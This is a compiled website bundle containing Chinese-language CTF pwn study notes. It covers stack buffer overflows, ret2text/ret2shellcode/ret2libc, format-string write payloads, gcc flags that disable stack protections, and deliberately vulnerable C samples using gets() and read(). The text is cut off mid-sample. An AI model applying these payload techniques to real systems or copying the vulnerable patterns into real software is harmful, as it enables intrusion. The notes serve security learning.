(window.webpackJsonp=window.webpackJsonp||[]).push([[5],{583:function(t,s,a){t.exports=a.p+"assets/img/pwn01.dd73c4b6.png"},584:function(t,s,a){t.exports=a.p+"assets/img/pwn02.154cb0d8.png"},585:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack02.4f741aff.jpg"},586:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack03.26f8fc28.jpg"},587:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack04.e80dc0f2.jpg"},588:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack05.47265dbf.jpg"},589:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack06.033ebe6d.jpg"},590:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack07.9db1df31.jpg"},591:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack08.1808e33a.jpg"},592:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack09.324945d7.jpg"},593:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack10.47be226c.jpg"},594:function(t,s,a){t.exports=a.p+"assets/img/pwn_ret2sc.cc0c5292.jpg"},595:function(t,s,a){t.exports=a.p+"assets/img/pwn_ret2shellcode.2195e07c.jpg"},596:function(t,s,a){t.exports=a.p+"assets/img/pwn_ret2sc02.df541c70.jpg"},597:function(t,s,a){t.exports=a.p+"assets/img/pwn_plt&got3.d64bcea3.jpg"},598:function(t,s,a){t.exports=a.p+"assets/img/pwn_plt&got.0f46e86f.jpg"},599:function(t,s,a){t.exports=a.p+"assets/img/pwn_plt&got2.6e252e31.jpg"},600:function(t,s,a){t.exports=a.p+"assets/img/pwn_GOT_Hijacking1.bff309d4.jpg"},601:function(t,s,a){t.exports=a.p+"assets/img/pwn_GOT_Hijacking2.82bd8af1.jpg"},602:function(t,s,a){t.exports=a.p+"assets/img/pwn_GOT_Hijacking3.d0132e89.jpg"},603:function(t,s,a){t.exports=a.p+"assets/img/pwn_02_ROPgaget.c85c40ce.jpg"},604:function(t,s,a){t.exports=a.p+"assets/img/pwn_04_ropchain_03.2f2c0dcf.jpg"},605:function(t,s,a){t.exports=a.p+"assets/img/pwn_04_ropchain_01.84ff6ba4.jpg"},606:function(t,s,a){t.exports=a.p+"assets/img/pwn_04_ropchain_02.d6909288.jpg"},607:function(t,s,a){t.exports=a.p+"assets/img/pwn03.4810bda5.png"},608:function(t,s,a){t.exports=a.p+"assets/img/pwn_stack01.2dfb902a.jpg"},609:function(t,s,a){t.exports=a.p+"assets/img/pwn_01_stack01.9d16e12f.jpg"},610:function(t,s,a){t.exports=a.p+"assets/img/C01.23d52081.jpg"},654:function(t,s,a){"use strict";a.r(s);var n=a(4),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("p",[t._v("[TOC]")]),t._v(" "),n("h1",{attrs:{id:"todo"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#todo"}},[t._v("#")]),t._v(" TODO")]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("0x0804866b: mov DWORD PTR [esp], 0x8048740 ; 这里是put的参数, 使用 x/s 0x8048740查看值\n0x08048672: call 0x8048460 <puts@plt>\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("h1",{attrs:{id:"推荐视频"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#推荐视频"}},[t._v("#")]),t._v(" 推荐视频")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://www.bilibili.com/video/BV1Db411y7g8?p=8",target:"_blank",rel:"noopener noreferrer"}},[t._v("BambooFox-2018-2019年合集-107学年社课"),n("OutboundLink")],1),t._v(" "),n("a",{attrs:{href:"https://www.bilibili.com/video/BV1SJ411s7MW",target:"_blank",rel:"noopener noreferrer"}},[t._v("【CTF】NTUSTISC - Pwn 基础教程"),n("OutboundLink")],1)]),t._v(" "),n("p",[t._v("资源: 百度网盘群号 6947231953")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("001.练习程序/pwn\n")])])]),n("h2",{attrs:{id:"cyclic"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#cyclic"}},[t._v("#")]),t._v(" cyclic")]),t._v(" "),n("p",[t._v("cyclic 200\n输入后看出错的地方，例0x62616164\ncyclic -l 0x62616164")]),t._v(" "),n("h1",{attrs:{id:"pwn"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#pwn"}},[t._v("#")]),t._v(" PWN")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://mp.weixin.qq.com/s/nFPCjsaUS8jNhluPvbR_8w",target:"_blank",rel:"noopener noreferrer"}},[t._v("PWN-基础栈溢出题型"),n("OutboundLink")],1)]),t._v(" "),n("h2",{attrs:{id:"tips"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#tips"}},[t._v("#")]),t._v(" Tips")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://blog.csdn.net/weixin_43868725/article/details/105962349#comments_12355290",target:"_blank",rel:"noopener noreferrer"}},[t._v("scanf不接受非法字符"),n("OutboundLink")],1),t._v("\n, 不能 p64(secret0_addr)+'%77c%8$n'。但是发现上一次输入的值100=0x64的偏移量为7。所以secret0_addr输入，构造payload='%85c%7$n'，这样就可以向secret0_addr中写入85了，从而通过验证。")]),t._v(" "),n("h2",{attrs:{id:"配置环境"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#配置环境"}},[t._v("#")]),t._v(" 配置环境")]),t._v(" "),n("p",[t._v("PIP使用国内源")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("mkdir ~/.pip/pip.conf\nvi ~/.pip/pip.conf\n\n复制一下，使用Shift+Insert粘贴内容如下：\n[global]\nindex-url = https://pypi.tuna.tsinghua.edu.cn/simple\n[install]\ntrusted-host=mirrors.aliyun.com\n")])])]),n("p",[t._v("最后按esc, wq!回车保存")]),t._v(" "),n("h2",{attrs:{id:"准备工具"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#准备工具"}},[t._v("#")]),t._v(" 准备工具")]),t._v(" "),n("p",[t._v("Linux 下")]),t._v(" "),n("p",[t._v("sudo pip3 install pwntools")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("如果没有pip就先 sudo apt install python-pip\n")])])]),n("h2",{attrs:{id:"解题思路"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#解题思路"}},[t._v("#")]),t._v(" 解题思路")]),t._v(" "),n("p",[t._v("1.没有NX保护，程序源码自带系统命令函数：直接覆盖返回地址即可\n2.没有NX保护，可以找到system函数的plt的绝对地址：使用ret2text\n3.没有NX保护，找不到system函数，利用输入函数，将shellcode写入到程序中：ret2shellcode\n4.有NX保护，利用ROPGadget配合int 0x80调用execve:ret2Syscal1\n5.有NX保护，利用Libc获取system函数的相对位置：ret2Libc\n6.源码审计:\n数组未检查。越界")]),t._v(" "),n("p",[t._v("checksec 查看保护机制，no Stack-canary可以用shellcode。根据不同的保护机制来进行构造不同的payload")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("如果安装了gdb peda, 进入gdb后 checksec filename\n")])])]),n("p",[t._v("在linux 32位的程序中，传递参数问题")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("传递参数值将参数放入栈中的，当传递的是字符串时表示将这个字符串的地址放入栈中。\n当将一个函数的返回覆盖成另一个函数的地址时需要将这个地址的上面一个位置当成这个函数的返回地址，再上面还有这个函数的参数，当有三个参数时eg：a,b,c这三个参数的入栈次序为c,b,a，即a在最下方\n可以使用pwntools里面自带的功能来构造shellcode。eg：shellcode=asm(shellcraft.sh())\n在栈中存储数字时需要使用p32或者p64进行转换eg：0x123456在栈中从高地址向低地址的存储为56,34,12，因为这是16进制的因此两个一组，当存储字符串时：eg：‘admin’在栈中从高地址向低地址的存储为n,i,m,d,a。\n使用ELF加载程序和process,remote加载程序是不同的，ELF是静态加载的，后面两种是动态的。\n")])])]),n("p",[t._v("简单溢出思路:")]),t._v(" "),n("p",[t._v("1、泄露一个ret2libc3函数的位置\n2、获取libc的版本（只有被执行过的函数才能获取地址）")]),t._v(" "),n("p",[t._v("①https://lilbe.blukat.me ②LibcSearcher:https://github.com/lieanu/LibcSearcher\n3、根据偏移获取she11和sh的位置\n①求libc基地址（函数动态地址-函数偏移量）\n②求其他函数地址（基地址+函数偏移量）\n4、执行程序获取shell")]),t._v(" "),n("p",[t._v("简单溢出操作:")]),t._v(" "),n("ol",[n("li",[t._v("拖进ida, Shift+F12, Ctrl+F 搜flag")]),t._v(" "),n("li",[t._v("有bin/sh,找溢出点通过system运行bin/sh的地址")]),t._v(" "),n("li",[t._v("字符串格式化漏洞, 打印多个"),n("code",[t._v(".%x")]),t._v("来计算栈参数位置, 通过溢出或 %85c%7$n 给栈中第7个参数赋值来修改。")])]),t._v(" "),n("h3",{attrs:{id:"libcsearcher"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#libcsearcher"}},[t._v("#")]),t._v(" LibcSearcher")]),t._v(" "),n("p",[t._v("安装")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("git clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\npython setup.py develop\n")])])]),n("p",[t._v("使用")]),t._v(" "),n("p",[t._v("如果遇到返回多个1ibc版本库的情况，可以通过add_condition（leaked_func，leaked_address）来添加\n限制条件，也可以手工选择其中一个libc版本（如果你确定的话）。")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" LibcSearcher "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 第二个参数，为已泄露的实际地址，或最后12位（比如:d90）, int类型")]),t._v("\nobj "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" LibcSearcher"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"fgets"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7ff39014bd90")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nobj"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"system"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# system偏移")]),t._v("\nobj"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"str_bin_sh"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# /bin/sh 偏移")]),t._v("\nobj"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dump"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"__libc_start_main_ret"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br")])]),n("h3",{attrs:{id:"学习路径"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#学习路径"}},[t._v("#")]),t._v(" 学习路径")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc",target:"_blank",rel:"noopener noreferrer"}},[t._v("路径"),n("OutboundLink")],1)]),t._v(" "),n("ol",[n("li",[t._v("基本ROP")])]),t._v(" "),n("p",[n("a",{attrs:{href:"https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/eeca3548.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("ret2text"),n("OutboundLink")],1),t._v(" "),n("a",{attrs:{href:"http://uuzdaisuki.com/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/",target:"_blank",rel:"noopener noreferrer"}},[t._v("原理"),n("OutboundLink")],1)]),t._v(" "),n("p",[t._v("ret2shellcode")]),t._v(" "),n("p",[t._v("ret2syscall")]),t._v(" "),n("p",[t._v("ret2libc")]),t._v(" "),n("ol",{attrs:{start:"2"}},[n("li",[t._v("中级ROP")])]),t._v(" "),n("p",[t._v("ret2csu")]),t._v(" "),n("p",[t._v("ret2reg")]),t._v(" "),n("p",[t._v("BROP")]),t._v(" "),n("ol",{attrs:{start:"3"}},[n("li",[t._v("高级 ROP")])]),t._v(" "),n("p",[t._v("ret2_dl_runtime_resolve")]),t._v(" "),n("p",[t._v("SROP")]),t._v(" "),n("p",[t._v("ret2VDSO")]),t._v(" "),n("h3",{attrs:{id:"常见漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#常见漏洞"}},[t._v("#")]),t._v(" 常见漏洞")]),t._v(" "),n("ol",[n("li",[n("p",[t._v("fgets(&s, 32, edata); 限制了32位长度")])]),t._v(" "),n("li",[n("p",[t._v("字符串溢出: 无栈保护, 没有字符长度检查时")])]),t._v(" "),n("li",[n("p",[t._v("字符串格式化漏洞: 用户输入字符，未检查长度，溢出覆盖返回地址。")])]),t._v(" "),n("li",[n("p",[t._v("整数溢出 int_overflow: 无符号数字 0-255, 超出识别为255内,259识别3。来过些判断")])]),t._v(" "),n("li",[n("p",[t._v("read溢出 返回main, 配合libc读取bin/sh，练习：xman_level3")])]),t._v(" "),n("li",[n("p",[t._v("ROP")])]),t._v(" "),n("li",[n("p",[t._v("glibc heap的一些利用.")])]),t._v(" "),n("li",[n("p",[t._v("IO_FILE结构的利用.")])])]),t._v(" "),n("p",[n("a",{attrs:{href:"#_6"}},[t._v("内存泄漏")])]),t._v(" "),n("p",[t._v("偏向实战:")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("webserver\n虚拟机逆向…\n内核提权..ctf中常常是写的驱动的问题.\n魔改的JS引擎.\n等等等.\n")])])]),n("h2",{attrs:{id:"基础学习"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#基础学习"}},[t._v("#")]),t._v(" 基础学习")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://www.csdn.net/gather_2a/MtTacg4sMDg1NS1ibG9n.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("参考"),n("OutboundLink")],1)]),t._v(" "),n("p",[t._v("比如有个函数vulnerable_function() 中执行一个读取操作时")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("执行过程")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("可读取空间")])]),t._v(" "),n("tr",[n("td",[t._v("可读取空间")])]),t._v(" "),n("tr",[n("td",[t._v("可读取空间")])]),t._v(" "),n("tr",[n("td",[t._v("…………")])]),t._v(" "),n("tr",[n("td",[t._v("s - string")])]),t._v(" "),n("tr",[n("td",[t._v("r - return 返回地址")])])])]),t._v(" "),n("p",[n("img",{attrs:{src:a(583),alt:"Alt text"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(584),alt:"Alt text"}})]),t._v(" "),n("p",[t._v("system函数执行:")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v('system_address + "return地址,随意填可为0x1" + bin_sh_addr\nsystem地址|假返回地址|执行参数(示例为bin/sh的地址)\n')])])]),n("p",[t._v("shellcode填写函数时，需要加返回地址:")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("0x88*'a'+p32(0xdeadbeef) + 函数地址 + 函数返回地址 + 参数1 + 参数2 + 参数3 ...\n")])])]),n("p",[t._v("Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐")]),t._v(" "),n("p",[n("a",{attrs:{href:"http://blog.eonew.cn/archives/958",target:"_blank",rel:"noopener noreferrer"}},[t._v("栈未对齐引发Crash"),n("OutboundLink")],1)]),t._v(" "),n("p",[n("a",{attrs:{href:"https://www.cnblogs.com/Rookle/p/12871878.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("栈未对齐引发Crash1"),n("OutboundLink")],1)]),t._v(" "),n("p",[n("strong",[t._v("基本输入输出FD")])]),t._v(" "),n("p",[t._v("fd的类型为int，值为0、1、2,分别代表标准输入、标准输出、标准错误输出。")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/",target:"_blank",rel:"noopener noreferrer"}},[t._v("LINUX SYSTEM CALL TABLE FOR X86 64"),n("OutboundLink")],1)]),t._v(" "),n("h3",{attrs:{id:"编译与执行"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#编译与执行"}},[t._v("#")]),t._v(" 编译与执行")]),t._v(" "),n("p",[t._v("程序执行顺序 start => __libc_start_main(main函数是从这里被call的), 所以stack有lib_c_start_main+231的ret addr")]),t._v(" "),n("h4",{attrs:{id:"关闭-canary等-保护机制"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#关闭-canary等-保护机制"}},[t._v("#")]),t._v(" 关闭 canary等 保护机制")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("gcc test.c -fno-statckprotector -o bof\ngcc test.c -fno-statckprotector -no-pie -o bof\ngcc test.c -fno-statckprotector -no-pie -z execstack -o ret2sc\n")])])]),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("gets")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//Input")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("puts")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//0utput")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("table",[n("thead",[n("tr",[n("th",[t._v("stack")]),t._v(" "),n("th",[t._v("description")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("...")]),t._v(" "),n("td",[t._v("low address")])]),t._v(" "),n("tr",[n("td",[t._v("buffer")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v("...")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v("saved rbp")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v("return address")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v("...")]),t._v(" "),n("td",[t._v("high address")])])])]),t._v(" "),n("hr"),t._v(" "),n("p",[t._v("输入一长串a后")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("comment")]),t._v(" "),n("th",[t._v("stack")]),t._v(" "),n("th",[t._v("description")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("...")]),t._v(" "),n("td",[t._v("low address")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v("buffer")]),t._v(" "),n("td",[t._v("aaaaaaaa")]),t._v(" "),n("td",[t._v(".")])]),t._v(" "),n("tr",[n("td",[t._v(".")]),t._v(" "),n("td",[t._v("aaaaaaaa")]),t._v(" "),n("td",[t._v(".")])]),t._v(" "),n("tr",[n("td",[t._v(".")]),t._v(" "),n("td",[t._v("aaaaaaaa")]),t._v(" "),n("td",[t._v(".")])]),t._v(" "),n("tr",[n("td",[t._v(".return address被输入盖掉了")]),t._v(" "),n("td",[t._v("aaaaaaaa")]),t._v(" "),n("td")]),t._v(" "),n("tr",[n("td",[t._v(".")]),t._v(" "),n("td",[t._v("aaaaaaaa")]),t._v(" "),n("td",[t._v("high address")])])])]),t._v(" "),n("h4",{attrs:{id:"gets-read"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#gets-read"}},[t._v("#")]),t._v(" gets & read")]),t._v(" "),n("ul",[n("li",[t._v("gets\n"),n("ul",[n("li",[t._v("没有限制输入长度")])])]),t._v(" "),n("li",[t._v("read\n"),n("ul",[n("li",[t._v("有限制最大输入长度")]),t._v(" "),n("li",[t._v("可overflow大小为最大输入长度与buffer长度之间")])])])]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("read")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//最大只能 overflow 8 bytes")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 最大长度16 - buffer 长度(8) = 8")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("puts")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br")])]),n("p",[n("img",{attrs:{src:a(585),alt:""}})]),t._v(" "),n("h4",{attrs:{id:"stack-canary"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#stack-canary"}},[t._v("#")]),t._v(" Stack Canary")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("在rbp之前塞一個random值，ret之前查是否相同，不同的话就 abort")])]),t._v(" "),n("li",[n("p",[t._v("有canary的括不能盖到return address rbp")])])]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("% ./test\naaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaa\n*** stack smashing detected ***; <unkonw> terminateed\nzsh:abort (core dumped) ./test\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("p",[n("img",{attrs:{src:a(586),alt:""}})]),t._v(" "),n("h4",{attrs:{id:"bof应用-buffer-overflow"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#bof应用-buffer-overflow"}},[t._v("#")]),t._v(" bof应用 (buffer overflow)")]),t._v(" "),n("ul",[n("li",[t._v("先看看stack上有什么\n"),n("ul",[n("li",[t._v("local variable")]),t._v(" "),n("li",[t._v("saved rbp ---\x3e stack migration")]),t._v(" "),n("li",[t._v("return address ---\x3e ret2 series")])])])]),t._v(" "),n("p",[t._v("bof-local variable")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdlib.h>")])]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buffer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),n("span",{pre:!0,attrs:{class:"token 